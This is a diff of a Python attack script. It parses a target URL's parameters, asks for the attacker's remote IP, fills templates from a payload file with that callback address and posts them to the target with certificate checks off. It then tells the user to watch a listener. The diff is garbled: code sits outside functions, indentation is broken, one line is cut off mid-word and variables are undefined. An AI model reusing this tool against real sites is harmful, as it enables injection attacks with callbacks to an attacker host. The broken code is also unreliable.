@@ -1,41 +1,58 @@
-import requests 
+import sys
+import requests
+import re
+import urllib3
 
-# predefine dictionary with arbitrary values
-payload = {
-	'fullname': 'script1',
-	'username': 'script2',
-	'password': 'password',
-	'email': 'declined@declined.com',
-	'imgurl': 'https%3A%2F%2Fnationaltoday.com%2Fwp-content%2Fuploads%2F2019%2F11%2Famerican-football-day.jpg'
-} 
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# opening a file in the directory to count how many payloads 
-# to end loop(s)
-num_of_lines = 0
+user_select = int(input('If any of these parameters are not vulnerable, please select the corresponding number: '))
+	for i in range(len(found_params)):
+		if user_select == (i):
+			j = user_select - 1
+			value = str(input('Please provide a valid value for this parameter: '))
+			popped = found_params.pop(j)
+			data[popped] = value
+			break
+	remote = str(input('Enter in your remote IP address:'))
+	for param in found_params:
+		data[param] = ''
+	fp = open('payload-template.txt', 'r')
+	for line in fp:
+		payload = line.strip('\n')
+		for param in found_params:
+			data[param] = payload.replace('<URL_HERE>', remote).replace('<PARAM', param)
+		r = requests.post(url, verify=False, params=data)
+		print('[+] Submitting payload.')
 
-with open('username.txt', 'r') as l:
+	print('[+] All payloads have been submitted. Please check your listener for responses.')
+
 	for line in l:
-		num_of_lines += 1
+		num_of_li
 		
-def inject_payloads():
-	soo = 0
-	
-	while soo < num_of_lines:
-		# with loop to loop through all lines of the files
-		with open('fullname.txt', 'r') as fname, open('username.txt', 'r') as uname, open('imgurl.txt', 'r') as imgurl:
-			# appending payloads into a list using the zip() function
-			for f, u, i in zip(fname, uname, imgurl):
-				
-				payload['fullname'] = f		# Replacing paramaters with the payload
-				payload['username'] = u
-				payload['imgurl'] = i
-				r = requests.post('http://<URL HERE>/', params=payload)
-				soo += 1
-				if str(r) == "<Response [200]>":
-					print('Payload successfully sent. Moving to next payload.')
-					print('URL: {}\n'.format(r.url))
-				else:
-					print('error')
+def stage():
+	input_url = str(input('Paste URL with parameters: '))
+
+	# REGEX patterns to find target and parameters
+	pattern_params = r"[?&]([^?&]+)="
+	pattern_target = r"\/\/([^\/]+)"
+	found_target = re.search(pattern_target, input_url)
+	found_params = re.findall(pattern_params, input_url)
+	data = {}
+
+    url = "http://" + found_target.group(1) + "/hijacking/"
+
+def main():
+	# Take in target URL, target input fields, actual number of input fields
+	if len(sys.argv) != 2:
+		print('[-] Usage: %s "<url>"' % sys.argv[0])
+		print('[-] Example: %s "www.example.com"' % sys.argv[0])
+		sys.exit(-1)
+
+	url = sys.argv[1]
+	stage()
+
+if __name__ == '__main__':
+	main()
 
 print('Detected {0} payloads . . . Starting POST requests.'.format(num_of_lines))	
 inject_payloads()
